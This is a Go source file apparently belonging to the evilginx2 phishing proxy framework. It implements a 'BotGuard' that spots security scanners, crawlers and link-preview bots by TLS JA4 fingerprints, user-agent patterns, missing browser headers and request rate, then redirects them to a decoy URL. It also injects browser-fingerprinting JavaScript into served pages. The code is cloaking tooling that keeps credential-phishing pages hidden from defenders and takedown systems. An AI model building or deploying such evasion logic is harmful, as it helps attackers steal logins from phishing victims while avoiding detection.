package core

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// BotGuard implements bot detection and protection mechanisms
type BotGuard struct {
	enabled          bool
	spoofURL         string // URL to reverse proxy when bot is detected
	knownBotJA4      map[string]bool
	knownBotUA       []*regexp.Regexp
	suspiciousIPs    map[string]*BotScore
	trustedIPs       map[string]bool
	mu               sync.RWMutex
	telemetryEnabled bool
}

// BotScore tracks suspicious activity from an IP
type BotScore struct {
	Score       int
	LastSeen    time.Time
	Requests    int
	NoJS        int // Requests without JS telemetry
	FastReqs    int // Suspiciously fast requests
	BotUA       int // Bot-like user agents
	BadJA4      int // Known bad JA4 signatures
	FirstSeen   time.Time
}

// Known bot JA4 fingerprints (TLS fingerprints commonly used by scanners/bots)
var defaultBotJA4 = []string{
	// Common security scanner fingerprints
	"t13d1516h2_8daaf6152771_e5627efa2ab1", // curl
	"t13d1517h2_8daaf6152771_e5627efa2ab1", // wget
	"t13d1516h2_8daaf6152771_b0da82dd1658", // python-requests
	"t13d1517h2_8daaf6152771_b0da82dd1658", // httpx
	"t13d1516h2_8daaf6152771_02e33be89be7", // Go http client
	"t13d1517h2_8daaf6152771_02e33be89be7", // Go http client variant
	"t13d1516h2_5b57614c22b0_e7bb9e4e4e43", // nuclei scanner
	"t13d1516h2_8daaf6152771_9e7bb9e4e4e4", // httpie
	"t13d301200_000000000000_00000000000",  // Generic scanner
}

// Known bot user-agent patterns
var defaultBotUAPatterns = []string{
	`(?i)bot`,
	`(?i)crawler`,
	`(?i)spider`,
	`(?i)curl`,
	`(?i)wget`,
	`(?i)python`,
	`(?i)httpx`,
	`(?i)nuclei`,
	`(?i)nikto`,
	`(?i)nmap`,
	`(?i)masscan`,
	`(?i)zgrab`,
	`(?i)gobuster`,
	`(?i)dirbuster`,
	`(?i)burp`,
	`(?i)scanner`,
	`(?i)scraper`,
	`(?i)headless`,
	`(?i)phantomjs`,
	`(?i)selenium`,
	`(?i)puppeteer`,
	`(?i)playwright`,
	`(?i)axios`,
	`(?i)node-fetch`,
	`(?i)go-http-client`,
	`(?i)java/`,
	`(?i)apache-httpclient`,
	`(?i)okhttp`,
	`(?i)urlgrabber`,
	`(?i)libwww`,
	`(?i)httpclient`,
	`(?i)facebookexternalhit`,
	`(?i)linkedinbot`,
	`(?i)twitterbot`,
	`(?i)slackbot`,
	`(?i)telegrambot`,
	`(?i)whatsapp`,
	`(?i)discordbot`,
	`(?i)googlebot`,
	`(?i)bingbot`,
	`(?i)yandex`,
	`(?i)baiduspider`,
	`(?i)duckduckbot`,
	`(?i)applebot`,
	`(?i)semrush`,
	`(?i)ahrefs`,
	`(?i)mj12bot`,
	`(?i)dotbot`,
	`(?i)petalbot`,
	`(?i)screaming`,
	`(?i)sitebulb`,
	`(?i)lighthouse`,
	`(?i)gtmetrix`,
	`(?i)pingdom`,
	`(?i)uptimerobot`,
	`(?i)statuspage`,
	`(?i)newrelic`,
	`(?i)datadog`,
	`(?i)zabbix`,
	`(?i)munin`,
	`(?i)nagios`,
	`(?i)prometheus`,
}

// NewBotGuard creates a new BotGuard instance
func NewBotGuard() *BotGuard {
	bg := &BotGuard{
		enabled:          false,
		spoofURL:         "",
		knownBotJA4:      make(map[string]bool),
		knownBotUA:       make([]*regexp.Regexp, 0),
		suspiciousIPs:    make(map[string]*BotScore),
		trustedIPs:       make(map[string]bool),
		telemetryEnabled: true,
	}

	// Load default bot JA4 signatures
	for _, ja4 := range defaultBotJA4 {
		bg.knownBotJA4[ja4] = true
	}

	// Compile bot UA patterns
	for _, pattern := range defaultBotUAPatterns {
		re, err := regexp.Compile(pattern)
		if err == nil {
			bg.knownBotUA = append(bg.knownBotUA, re)
		}
	}

	return bg
}

// Enable enables bot protection
func (bg *BotGuard) Enable(spoofURL string) {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	bg.enabled = true
	bg.spoofURL = spoofURL
	log.Info("BotGuard enabled - spoofing to: %s", spoofURL)
}

// Disable disables bot protection
func (bg *BotGuard) Disable() {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	bg.enabled = false
	log.Info("BotGuard disabled")
}

// IsEnabled returns whether BotGuard is enabled
func (bg *BotGuard) IsEnabled() bool {
	bg.mu.RLock()
	defer bg.mu.RUnlock()
	return bg.enabled
}

// GetSpoofURL returns the URL to spoof when bot is detected
func (bg *BotGuard) GetSpoofURL() string {
	bg.mu.RLock()
	defer bg.mu.RUnlock()
	return bg.spoofURL
}

// AddTrustedIP adds an IP to the trusted list (won't be checked)
func (bg *BotGuard) AddTrustedIP(ip string) {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	bg.trustedIPs[ip] = true
}

// AddBotJA4 adds a JA4 signature to the known bot list
func (bg *BotGuard) AddBotJA4(ja4 string) {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	bg.knownBotJA4[ja4] = true
}

// AddBotUA adds a user-agent pattern to the known bot list
func (bg *BotGuard) AddBotUA(pattern string) error {
	re, err := regexp.Compile(pattern)
	if err != nil {
		return err
	}
	bg.mu.Lock()
	defer bg.mu.Unlock()
	bg.knownBotUA = append(bg.knownBotUA, re)
	return nil
}

// CheckRequest analyzes a request and returns true if it appears to be from a bot
func (bg *BotGuard) CheckRequest(req *http.Request, ja4Fingerprint string) (bool, string) {
	if !bg.IsEnabled() {
		return false, ""
	}

	clientIP := bg.getClientIP(req)
	
	// Check if IP is trusted
	bg.mu.RLock()
	if bg.trustedIPs[clientIP] {
		bg.mu.RUnlock()
		return false, ""
	}
	bg.mu.RUnlock()

	// Get or create bot score for this IP
	score := bg.getOrCreateScore(clientIP)
	reasons := []string{}

	// Check 1: JA4 fingerprint
	if ja4Fingerprint != "" {
		bg.mu.RLock()
		if bg.knownBotJA4[ja4Fingerprint] {
			score.BadJA4++
			score.Score += 50
			reasons = append(reasons, fmt.Sprintf("known_bot_ja4:%s", ja4Fingerprint))
		}
		bg.mu.RUnlock()
	}

	// Check 2: User-Agent analysis
	ua := req.UserAgent()
	if ua == "" {
		score.BotUA++
		score.Score += 30
		reasons = append(reasons, "empty_user_agent")
	} else {
		bg.mu.RLock()
		for _, re := range bg.knownBotUA {
			if re.MatchString(ua) {
				score.BotUA++
				score.Score += 40
				reasons = append(reasons, fmt.Sprintf("bot_ua_pattern:%s", re.String()))
				break
			}
		}
		bg.mu.RUnlock()
	}

	// Check 3: Missing common browser headers
	if req.Header.Get("Accept-Language") == "" {
		score.Score += 10
		reasons = append(reasons, "missing_accept_language")
	}
	if req.Header.Get("Accept-Encoding") == "" {
		score.Score += 10
		reasons = append(reasons, "missing_accept_encoding")
	}
	
	// Check 4: Suspicious header combinations
	secFetchSite := req.Header.Get("Sec-Fetch-Site")
	secFetchMode := req.Header.Get("Sec-Fetch-Mode")
	secFetchDest := req.Header.Get("Sec-Fetch-Dest")
	
	// Real browsers send Sec-Fetch-* headers
	if secFetchSite == "" && secFetchMode == "" && secFetchDest == "" {
		// Check if UA claims to be a modern browser
		if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Firefox/") || strings.Contains(ua, "Safari/") {
			score.Score += 20
			reasons = append(reasons, "missing_sec_fetch_headers")
		}
	}

	// Check 5: Request rate analysis
	score.Requests++
	timeSinceFirst := time.Since(score.FirstSeen)
	if timeSinceFirst > 0 && score.Requests > 1 {
		requestsPerSecond := float64(score.Requests) / timeSinceFirst.Seconds()
		if requestsPerSecond > 10 {
			score.FastReqs++
			score.Score += 25
			reasons = append(reasons, fmt.Sprintf("high_request_rate:%.2f/s", requestsPerSecond))
		}
	}

	score.LastSeen = time.Now()

	// Determine if this is a bot based on score
	isBot := score.Score >= 50

	if isBot && len(reasons) > 0 {
		log.Warning("[BotGuard] Bot detected from %s (score: %d) - reasons: %s", 
			clientIP, score.Score, strings.Join(reasons, ", "))
	}

	return isBot, strings.Join(reasons, ", ")
}

// RecordTelemetryReceived records that JS telemetry was received from an IP
// This indicates the client executed JavaScript (likely a real browser)
func (bg *BotGuard) RecordTelemetryReceived(ip string) {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	
	if score, exists := bg.suspiciousIPs[ip]; exists {
		// Reduce score significantly when telemetry is received
		score.Score -= 30
		if score.Score < 0 {
			score.Score = 0
		}
	}
}

// RecordNoTelemetry records that a request was made without subsequent JS telemetry
func (bg *BotGuard) RecordNoTelemetry(ip string) {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	
	if score, exists := bg.suspiciousIPs[ip]; exists {
		score.NoJS++
		score.Score += 15
	}
}

// getOrCreateScore gets or creates a bot score entry for an IP
func (bg *BotGuard) getOrCreateScore(ip string) *BotScore {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	
	if score, exists := bg.suspiciousIPs[ip]; exists {
		return score
	}
	
	score := &BotScore{
		Score:     0,
		FirstSeen: time.Now(),
		LastSeen:  time.Now(),
	}
	bg.suspiciousIPs[ip] = score
	return score
}

// getClientIP extracts the client IP from the request
func (bg *BotGuard) getClientIP(req *http.Request) string {
	// Check X-Forwarded-For header
	xff := req.Header.Get("X-Forwarded-For")
	if xff != "" {
		ips := strings.Split(xff, ",")
		if len(ips) > 0 {
			return strings.TrimSpace(ips[0])
		}
	}
	
	// Check X-Real-IP header
	xri := req.Header.Get("X-Real-IP")
	if xri != "" {
		return xri
	}
	
	// Fall back to RemoteAddr
	host, _, err := net.SplitHostPort(req.RemoteAddr)
	if err != nil {
		return req.RemoteAddr
	}
	return host
}

// CleanupOldEntries removes old entries from the suspicious IPs map
func (bg *BotGuard) CleanupOldEntries(maxAge time.Duration) {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	
	now := time.Now()
	for ip, score := range bg.suspiciousIPs {
		if now.Sub(score.LastSeen) > maxAge {
			delete(bg.suspiciousIPs, ip)
		}
	}
}

// GetStats returns bot guard statistics
func (bg *BotGuard) GetStats() map[string]interface{} {
	bg.mu.RLock()
	defer bg.mu.RUnlock()
	
	return map[string]interface{}{
		"enabled":        bg.enabled,
		"spoof_url":      bg.spoofURL,
		"tracked_ips":    len(bg.suspiciousIPs),
		"trusted_ips":    len(bg.trustedIPs),
		"known_bot_ja4":  len(bg.knownBotJA4),
		"known_bot_ua":   len(bg.knownBotUA),
	}
}

// GenerateTelemetryJS returns JavaScript code for browser telemetry collection
func (bg *BotGuard) GenerateTelemetryJS(callbackEndpoint string) string {
	// Generate unique token for this request
	token := bg.generateToken()
	
	return fmt.Sprintf(`
<script>
(function() {
    var t = {
        ts: Date.now(),
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang: navigator.language,
        plat: navigator.platform,
        cores: navigator.hardwareConcurrency || 0,
        mem: navigator.deviceMemory || 0,
        touch: 'ontouchstart' in window,
        webgl: (function() {
            try {
                var c = document.createElement('canvas');
                var g = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (g) {
                    var d = g.getExtension('WEBGL_debug_renderer_info');
                    return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : 'unknown';
                }
            } catch(e) {}
            return 'none';
        })(),
        sw: screen.width,
        sh: screen.height,
        cd: screen.colorDepth,
        plugins: navigator.plugins ? navigator.plugins.length : 0,
        token: '%s'
    };
    
    // Send telemetry
    var x = new XMLHttpRequest();
    x.open('POST', '%s', true);
    x.setRequestHeader('Content-Type', 'application/json');
    x.send(JSON.stringify(t));
})();
</script>
`, token, callbackEndpoint)
}

// generateToken creates a unique token for telemetry correlation
func (bg *BotGuard) generateToken() string {
	data := fmt.Sprintf("%d-%d", time.Now().UnixNano(), time.Now().Unix())
	hash := md5.Sum([]byte(data))
	return hex.EncodeToString(hash[:])
}

// ValidateTelemetry validates received telemetry data
func (bg *BotGuard) ValidateTelemetry(data map[string]interface{}) bool {
	// Check for required fields
	requiredFields := []string{"ts", "tz", "lang", "plat", "sw", "sh"}
	for _, field := range requiredFields {
		if _, exists := data[field]; !exists {
			return false
		}
	}
	
	// Check for suspicious values
	if sw, ok := data["sw"].(float64); ok {
		if sw == 0 {
			return false // Screen width shouldn't be 0
		}
	}
	
	if sh, ok := data["sh"].(float64); ok {
		if sh == 0 {
			return false // Screen height shouldn't be 0
		}
	}
	
	return true
}

// Global BotGuard instance
var globalBotGuard *BotGuard
var botGuardOnce sync.Once

// GetBotGuard returns the global BotGuard instance
func GetBotGuard() *BotGuard {
	botGuardOnce.Do(func() {
		globalBotGuard = NewBotGuard()
		
		// Start cleanup goroutine
		go func() {
			ticker := time.NewTicker(5 * time.Minute)
			for range ticker.C {
				globalBotGuard.CleanupOldEntries(1 * time.Hour)
			}
		}()
	})
	return globalBotGuard
}
